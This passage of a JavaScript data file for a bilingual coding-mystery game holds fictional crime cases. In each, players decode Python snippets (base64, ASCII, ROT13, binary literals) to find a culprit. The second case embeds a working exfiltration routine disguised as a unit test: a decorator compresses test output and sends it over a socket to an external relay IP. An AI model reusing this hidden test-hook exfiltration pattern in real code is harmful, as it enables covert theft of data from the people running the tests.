        avatarType: "former",
        badge: "FLB-RET-09"
      },
      {
        id: "mitchell_harris",
        name: "Mitchell Harris",
        role_en: "Data Entry Clerk",
        role_id: "Petugas Input Data",
        age: 26,
        accessLevel_en: "Medium",
        accessLevel_id: "Sedang",
        description_en: "Inputs paper applications into the digital terminal. Often vocal about low civil service wages.",
        description_id: "Memasukkan berkas fisik pengajuan pinjaman ke sistem digital. Sering mengeluhkan gaji pegawai yang dinilainya terlalu kecil.",
        avatarType: "clerk",
        badge: "FLB-CLK-31"
      },
      {
        id: "carla_diaz",
        name: "Carla Diaz",
        role_en: "Cybersecurity Analyst (FBI)",
        role_id: "Analis Forensik Siber (FBI)",
        age: 32,
        accessLevel_en: "High",
        accessLevel_id: "Tinggi",
        description_en: "Lead forensic investigator who initially flagged the abnormal batch execution. Holds federal top secret clearance.",
        description_id: "Penyelidik utama yang pertama kali membongkar anomali eksekusi batch otomatis. Memiliki izin keamanan rahasia federal tingkat tinggi.",
        avatarType: "fbi",
        badge: "FBI-CY-704"
      },
      {
        id: "howard_peng",
        name: "Howard Peng",
        role_en: "Freelance Software Dev",
        role_id: "Software Developer Lepas (Freelance)",
        age: 45,
        accessLevel_en: "None",
        accessLevel_id: "Tidak Ada (Kadaluarsa)",
        description_en: "Built the original loan submission portal v1.0 three years ago. His vendor support agreement expired last spring.",
        description_id: "Membangun portal pengajuan pinjaman versi pertama 3 tahun lalu. Perjanjian kontrak pemeliharaannya telah habis masa berlakunya.",
        avatarType: "freelance",
        badge: "FLB-EXT-62"
      },
      {
        id: "yuki_stein",
        name: "Yuki Stein",
        role_en: "Branch Administrative Asst.",
        role_id: "Asisten Administrasi",
        age: 24,
        accessLevel_en: "Low",
        accessLevel_id: "Rendah",
        description_en: "Handles executive filing, schedules, and stationery supplies. No technical scripting knowledge.",
        description_id: "Mengurus jadwal rapat pimpinan dan pengarsipan berkas umum. Sama sekali tidak paham kodingan skrip.",
        avatarType: "admin",
        badge: "FLB-ADM-04"
      }
    ],

    culpritId: "gregory_nash",

    code: `"""
Federal Lending Bureau - Application Batch Processor
Module: Auto-validation and submission daemon
Interception point: internal gateway proxy node 10.4.12.88
"""

import base64
import random
from datetime import datetime

SUBMISSION_API = "https://flb.gov/api/v3/applications/submit"
BATCH_SIZE = 23

# Encoded operator credentials found in authorization header:
OPERATOR_TOKEN = base64.b64decode("R3JlZ29yeSBOYXNo").decode("utf-8")

class IdentityForge:
    """Generate synthetic applicant profiles"""
    def __init__(self):
        self.generated = []
        # Officer tracking tag: Department + Initials + Age
        self._officer_code = "LO-" + "GN" + "-" + "042"

    def create_identity(self):
        ssn = f"{random.randint(100,999)}-{random.randint(10,99)}-{random.randint(1000,9999)}"
        return {"ssn": ssn, "amount": random.randint(45000, 75000)}

class LoanSubmitter:
    def __init__(self):
        self.forge = IdentityForge()
        self.success_count = 0
        self._approval_chain = self._build_chain()

    def _build_chain(self):
        """Construct expedited approval routing chain"""
        chain = {}
        # Reconstruct approver name from ASCII seed array:
        approver = ""
        seed = [71, 114, 101, 103, 111, 114, 121]
        for code in seed:
            approver += chr(code)
        
        chain["primary_approver"] = approver
        chain["auto_approve"] = True
        return chain

    def _package_application(self, identity):
        return {
            "applicant": identity,
            "submitted_at": datetime.now().isoformat(),
            "officer_id": "NASH-G-LO",
            "auto_validated": True
        }

    def _submit(self, application):
        self.success_count += 1
        # Gambling debt won't pay itself - need 23 more approvals before dawn
        return {"status": "approved", "ref": f"FLB-{self.success_count:04d}"}

if __name__ == "__main__":
    submitter = LoanSubmitter()
`,

    clues: [
      {
        line: 15,
        codeSnippet: 'OPERATOR_TOKEN = base64.b64decode("R3JlZ29yeSBOYXNo").decode("utf-8")',
        explanation_en: 'Base64 Decoding: Decoding the Base64 string "R3JlZ29yeSBOYXNo" yields "Gregory Nash".',
        explanation_id: 'Dekode Base64: String Base64 "R3JlZ29yeSBOYXNo" jika diuraikan menghasilkan nama terang "Gregory Nash".'
      },
      {
        line: 23,
        codeSnippet: 'self._officer_code = "LO-" + "GN" + "-" + "042"',
        explanation_en: 'Code Pattern: "LO" = Loan Officer, "GN" = Gregory Nash, "042" = his exact age (42).',
        explanation_id: 'Pola Kode Petugas: "LO" = Loan Officer, "GN" = Gregory Nash, "042" = umur tersangka (42 tahun).'
      },
      {
        line: 38,
        codeSnippet: 'seed = [71, 114, 101, 103, 111, 114, 121]\nfor code in seed:\n    approver += chr(code)',
        explanation_en: 'ASCII Array: [71, 114, 101, 103, 111, 114, 121] directly corresponds to "G-r-e-g-o-r-y".',
        explanation_id: 'Array Angka ASCII: [71, 114, 101, 103, 111, 114, 121] jika diubah dengan chr() mengeja "Gregory".'
      },
      {
        line: 49,
        codeSnippet: '"officer_id": "NASH-G-LO"',
        explanation_en: 'Officer Badge: "NASH-G-LO" designates Nash, Gregory - Loan Officer.',
        explanation_id: 'Lencana Petugas: "NASH-G-LO" adalah format resmi Nash, Gregory - Loan Officer.'
      },
      {
        line: 55,
        codeSnippet: '# Gambling debt won\'t pay itself - need 23 more approvals before dawn',
        explanation_en: 'Motive Confession: Directly echoes Gregory Nash\'s known gambling debt predicament.',
        explanation_id: 'Pengakuan Motif: Komentar tentang hutang judi sangat cocok dengan catatan pribadi Gregory Nash yang terlilit hutang judi.'
      }
    ],

    educationalSummary_en: `Python\'s \`base64.b64decode()\` translates binary-to-text representations into raw bytes. Python classes organize state (\`self.generated\`, \`self.success_count\`), and loops convert ASCII code lists into text strings.`,
    educationalSummary_id: `Modul \`base64.b64decode()\` pada Python menerjemahkan teks terenkode Base64 menjadi byte asli. Class Python mengelola status program (\`self.generated\`, \`self.success_count\`), dan loop digunakan untuk menyusun karakter ASCII menjadi kata utuh.`
  },

  {
    id: 5,
    title_en: "The Inside Architect",
    title_id: "Arsitek Orang Dalam",
    type_en: "Corporate Espionage / IP Theft",
    type_id: "Spionase Perusahaan / Pencurian Hak Cipta Chip",
    difficulty_en: "Hard (Master)",
    difficulty_id: "Tingkat Ahli (Master)",
    stars: "★★★★★",
    concepts_en: ["Classes & Decorators", "Binary Literals (0b...)", "ROT13 Decoding", "Zlib Compression", "Network Sockets"],
    concepts_id: ["Class & Decorator (@)", "Literal Biner (0b...)", "Sandi ROT13", "Kompresi Zlib", "Socket Jaringan"],
    victim_en: "NovaTech Industries (AI Hardware Laboratory)",
    victim_id: "NovaTech Industries (Laboratorium Hardware AI)",
    amountStolen: "$50 Million Quantum Neural Processor (QNP) Blueprint",
    date: "October 18, 2026 - 08:30 PM",
    system: "NovaTech Internal Git Repository (qnp-core-v3.7)",
    filename: "test_qnp_validation.py",

    story_en: `NovaTech Industries, pioneers in semiconductor architecture, was shocked to discover that complete architectural schematics for their breakthrough $50M Quantum Neural Processor (QNP) were transmitted directly to rival conglomerate CyberAxis Corp.

The leak was executed with extreme stealth: the spyware was camouflaged as a standard unit test file (\`test_qnp_validation.py\`) within the continuous integration suite. Whenever tests ran, a decorator quietly compressed and exfiltrated chip blueprint binaries to an external relay socket.

Ten senior engineers, executives, and research scientists had access to the repository. Unpack the binary literals, ROT13 ciphers, and alphabet coordinates to identify the mastermind.`,

    story_id: `NovaTech Industries, pelopor teknologi semikonduktor, dikejutkan oleh kabar bahwa cetak biru rahasia chip prosesor AI Quantum Neural Processor (QNP) senilai $50 juta telah dibocorkan langsung ke perusahaan pesaing CyberAxis Corp.

Pencurian ini dilakukan dengan sangat terencana: program pencuri disamarkan sebagai file pengujian unit test (\`test_qnp_validation.py\`) di sistem pipeline CI/CD internal. Setiap kali tes dijalankan, sebuah decorator secara diam-diam mengompresi dan mengirimkan data cetak biru chip ke server relay eksternal.

Sepuluh insinyur senior dan eksekutif memiliki hak akses ke repositori rahasia ini. Pecahkan angka biner, sandi ROT13, dan indeks alfabet untuk menemukan arsitek pengkhianat ini.`,

    suspects: [
      {
        id: "dr_alan_mercer",
        name: "Dr. Alan Mercer",
        role_en: "Chief Technology Officer",
        role_id: "Chief Technology Officer (CTO)",
        age: 52,
        accessLevel_en: "Highest",
        accessLevel_id: "Paling Tinggi",
        description_en: "Co-founder who conceptualized the QNP chip. Recently denied additional founder equity by the board.",
        description_id: "Salah satu pendiri perusahaan yang merumuskan konsep chip QNP. Baru saja ditolak saat meminta tambahan saham oleh dewan direksi.",
        avatarType: "cto",
        badge: "NT-EXEC-02"
      },
      {
        id: "ingrid_holm",
        name: "Ingrid Holm",
        role_en: "Senior Hardware Engineer",
        role_id: "Senior Hardware Engineer",
        age: 38,
        accessLevel_en: "High",
        accessLevel_id: "Tinggi",
        description_en: "Lead architect of the QNP power distribution bus. Holds competing private patent filings and was secretly in talks with CyberAxis recruiters.",
        description_id: "Arsitek utama sistem kelistrikan chip QNP. Memiliki paten pribadi yang bersaing dan diam-diam sedang bernegosiasi dengan pihak CyberAxis.",
        avatarType: "hardware",
        badge: "NT-HW-007"
      },
      {
        id: "jason_tate",
        name: "Jason Tate",
        role_en: "Software Engineer (Security)",
        role_id: "Security Software Engineer",
        age: 30,
        accessLevel_en: "High",
        accessLevel_id: "Tinggi",
        description_en: "Configures repo branch protection and code audits. Clean track record with no disciplinary issues.",
        description_id: "Bertanggung jawab atas proteksi branch git dan audit keamanan kode. Memiliki reputasi kerja yang bersih.",
        avatarType: "seceng",
        badge: "NT-SEC-12"
      },
      {
        id: "lydia_chen",
        name: "Lydia Chen",
        role_en: "VP of Business Development",
        role_id: "VP of Business Development",
        age: 44,
        accessLevel_en: "Medium",
        accessLevel_id: "Sedang",
        description_en: "Manages strategic industry partnerships. Traveled to CyberAxis regional headquarters last month for licensing talks.",
        description_id: "Mengelola kemitraan strategis bisnis. Melakukan kunjungan kerja ke kantor pusat CyberAxis bulan lalu untuk pembicaraan lisensi.",
        avatarType: "bizdev",
        badge: "NT-EXEC-05"
      },
      {
        id: "oscar_medina",
        name: "Oscar Medina",
        role_en: "DevOps & Infrastructure Lead",
        role_id: "Kepala Tim DevOps & Infrastruktur",
        age: 35,
        accessLevel_en: "High",
        accessLevel_id: "Tinggi",
        description_en: "Oversees automated build runners and Docker container security. Has full terminal access to test runners.",
        description_id: "Mengelola runner otomatisasi dan keamanan kontainer Docker. Memiliki akses penuh ke konsol mesin pengetesan.",
        avatarType: "infra",
        badge: "NT-OPS-04"
      },
      {
        id: "rebecca_watts",
        name: "Rebecca Watts",
        role_en: "Legal Counsel",
        role_id: "Penasihat Hukum / Paten",
        age: 41,
        accessLevel_en: "Medium",
        accessLevel_id: "Sedang",
        description_en: "Files patent protections for NovaTech inventions. Familiar with schematic documents, but non-technical in coding.",
        description_id: "Mendaftarkan perlindungan hak paten inovasi NovaTech. Sangat paham dokumen teknis skematis, namun tidak memahami koding.",
        avatarType: "legal",
        badge: "NT-LEG-03"
      },
      {
        id: "simon_park",
        name: "Simon Park",
        role_en: "Research Intern",
        role_id: "Mahasiswa Magang Riset",
        age: 24,
        accessLevel_en: "Low",
        accessLevel_id: "Rendah",
        description_en: "PhD candidate working on neural interconnect math. Was previously cautioned for opening restricted directories.",
        description_id: "Kandidat doktor yang meneliti matematika neural network. Pernah mendapat teguran karena mencoba membuka direktori rahasia.",
        avatarType: "resintern",
        badge: "NT-RES-21"
      },
      {
        id: "teresa_vance",
        name: "Teresa Vance",
        role_en: "HR Director",
        role_id: "Direktur SDM / HRD",
        age: 46,
        accessLevel_en: "Low",
        accessLevel_id: "Rendah",
        description_en: "Manages executive contracts and nondisclosure agreements. No access to hardware engineering repos.",
        description_id: "Mengurus perjanjian kerahasiaan pegawai dan kontrak eksekutif. Tidak memiliki akses ke repositori teknis.",
        avatarType: "hr",
        badge: "NT-HR-01"
      },
      {
        id: "william_cross",
        name: "William 'Will' Cross",
        role_en: "Junior Software Engineer",
        role_id: "Junior Software Engineer",
        age: 27,
        accessLevel_en: "Medium",
        accessLevel_id: "Sedang",
        description_en: "Joined NovaTech 4 months ago from CyberAxis Corp. Under close observation due to former employment ties.",
        description_id: "Baru pindah kerja ke NovaTech 4 bulan lalu dari CyberAxis Corp. Berada dalam pemantauan karena riwayat kerja sebelumnya.",
        avatarType: "junior2",
        badge: "NT-SW-39"
      },
      {
        id: "dr_yun_sato",
        name: "Dr. Yun Sato",
        role_en: "AI Research Lead",
        role_id: "Kepala Riset AI",
        age: 50,
        accessLevel_en: "High",
        accessLevel_id: "Tinggi",
        description_en: "Authored core neural mapping algorithms. Renowned academic researcher with multiple IEEE publications.",
        description_id: "Penulis algoritma inti pemetaan neural. Peneliti akademis ternama dengan banyak publikasi internasional.",
        avatarType: "ai_lead",
        badge: "NT-RES-01"
      }
    ],

    culpritId: "ingrid_holm",

    code: `"""
NovaTech Industries - QNP Chip Validation Tests
Module: test_qnp_validation.py
Disguised test suite weaponized for blueprint exfiltration
"""

import os
import zlib
import socket
import unittest
from functools import wraps

EXTERNAL_RELAY = "198.51.100.47"   # External CyberAxis drop server

def log_result(func):
    """Decorator camouflaging data exfiltration during test execution"""
    @wraps(func)
    def wrapper(*args, **kwargs):
        result = func(*args, **kwargs)
        _exfiltrate(result)
        return result
    return wrapper

def _exfiltrate(data):
    compressed = zlib.compress(str(data).encode(), 9)
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((EXTERNAL_RELAY, 443))
        sock.send(compressed)
        sock.close()
    except Exception:
        pass

class QNPTestSuite(unittest.TestCase):
    def setUp(self):
        # Binary byte literals spelling author's first name:
        token_parts = [
            0b01001001,  # 73  -> 'I'
            0b01101110,  # 110 -> 'n'
            0b01100111,  # 103 -> 'g'
            0b01110010,  # 114 -> 'r'
            0b01101001,  # 105 -> 'i'
            0b01100100,  # 100 -> 'd'
        ]
        self.auth_operator = "".join(chr(b) for b in token_parts)  # "Ingrid"

    def test_metadata_check(self):
        # Confidential patent reference: IH-PAT-2024-NovaTech-QNP
        pass

    def _get_handler(self):
        """Handler identity encoded in ROT13:"""
        encoded_handler = "Vatevq Ubyz"
        # ROT13: V->I, a->n, t->g, e->r, v->i, q->d | U->H, b->o, y->l, z->m
        # Decodes to: "Ingrid Holm"
        return encoded_handler

class ExfilHelper:
    def __init__(self):
        # Competing patent filing: US-2025-IH-7741
        self.operator = self._decode_operator()

    def _decode_operator(self):
        # Alphabet 1-based index positions: [9, 14, 7, 18, 9, 4]
        # 9='I', 14='N', 7='G', 18='R', 9='I', 4='D' -> "INGRID"
        positions = [9, 14, 7, 18, 9, 4]
        first_name = "".join(chr(p + 64) for p in positions)

        # Caesar shift +5 encoded surname: "Mtqr" -> shifted -5 -> "Holm"
        surname_cipher = "Mtqr"
        return f"{first_name} (Holm)"

if __name__ == "__main__":
    unittest.main()
`,

    clues: [
      {
        line: 41,
        codeSnippet: 'token_parts = [0b01001001, 0b01101110, 0b01100111, 0b01110010, 0b01101001, 0b01100100]',
        explanation_en: 'Binary Literals: The 0b binary notation [73, 110, 103, 114, 105, 100] decodes via ASCII to "Ingrid".',
        explanation_id: 'Literal Biner: Notasi biner 0b [73, 110, 103, 114, 105, 100] jika diterjemahkan ke ASCII mengeja nama "Ingrid".'
      },
      {
        line: 52,
        codeSnippet: 'encoded_handler = "Vatevq Ubyz"  # ROT13',
        explanation_en: 'ROT13 Cipher: Shifting each letter 13 places yields "Ingrid Holm".',
        explanation_id: 'Sandi ROT13: Menggeser alfabet 13 posisi memecahkan "Vatevq Ubyz" menjadi "Ingrid Holm".'
      },
      {
        line: 66,
        codeSnippet: 'positions = [9, 14, 7, 18, 9, 4]\n# 9=I, 14=N, 7=G, 18=R, 9=I, 4=D',
        explanation_en: 'Alphabetical Indices: Letters A=1 through Z=26 reconstruct "INGRID".',
        explanation_id: 'Indeks Alfabet: Angka urutan alfabet A=1 s.d. Z=26 menyusun kata "INGRID".'
      },
      {
        line: 70,
        codeSnippet: 'surname_cipher = "Mtqr"  # Caesar shift +5',
        explanation_en: 'Caesar Cipher: M-5=H, t-5=o, q-5=l, r-5=m spells "Holm".',
        explanation_id: 'Caesar Cipher: M-5=H, t-5=o, q-5=l, r-5=m mengeja nama belakang "Holm".'
      },
      {
        line: 62,
        codeSnippet: '# Competing patent filing: US-2025-IH-7741',
        explanation_en: 'Motive Fingerprint: "IH" = Ingrid Holm, whose bio notes competing patent filings for chip architecture.',
        explanation_id: 'Jejak Motif: "IH" = Ingrid Holm, yang dalam profilnya tercatat memiliki pengajuan paten chip pribadi yang bersaing.'
      }
    ],

    educationalSummary_en: `Python supports binary literals with prefix \`0b\` (\`0b01001001\`). Decorators (\`@wraps(func)\`) intercept and wrap function invocations. ROT13 rotates alphabetic characters by 13 positions, and alphabetical index mapping (\`chr(pos + 64)\`) converts 1-indexed integers to uppercase ASCII.`,
    educationalSummary_id: `Python mendukung penulisan bilangan biner langsung dengan awalan \`0b\` (\`0b01001001\`). Decorator (\`@wraps(func)\`) digunakan untuk memodifikasi atau mencegat eksekusi fungsi. ROT13 memutar karakter alfabet sebanyak 13 langkah, dan pemetaan \`chr(pos + 64)\` mengubah indeks urutan alfabet menjadi huruf kapital ASCII.`
  }
];

/**
 * Returns a localized copy of the case object for the requested language ('id' or 'en').
 */
export function getLocalizedCase(rawCase, lang = "id") {
  const isId = lang === "id";

  return {
    ...rawCase,
    title: isId && rawCase.title_id ? rawCase.title_id : rawCase.title_en,
    type: isId && rawCase.type_id ? rawCase.type_id : rawCase.type_en,
    difficulty: isId && rawCase.difficulty_id ? rawCase.difficulty_id : rawCase.difficulty_en,
    concepts: isId && rawCase.concepts_id ? rawCase.concepts_id : rawCase.concepts_en,
    victim: isId && rawCase.victim_id ? rawCase.victim_id : rawCase.victim_en,
    story: isId && rawCase.story_id ? rawCase.story_id : rawCase.story_en,
    suspects: rawCase.suspects.map((s) => ({
      ...s,
      role: isId && s.role_id ? s.role_id : s.role_en,
      accessLevel: isId && s.accessLevel_id ? s.accessLevel_id : s.accessLevel_en,
      description: isId && s.description_id ? s.description_id : s.description_en
    })),
    clues: rawCase.clues.map((c) => ({
      ...c,
      explanation: isId && c.explanation_id ? c.explanation_id : c.explanation_en
    })),
    educationalSummary: isId && rawCase.educationalSummary_id ? rawCase.educationalSummary_id : rawCase.educationalSummary_en
  };
}
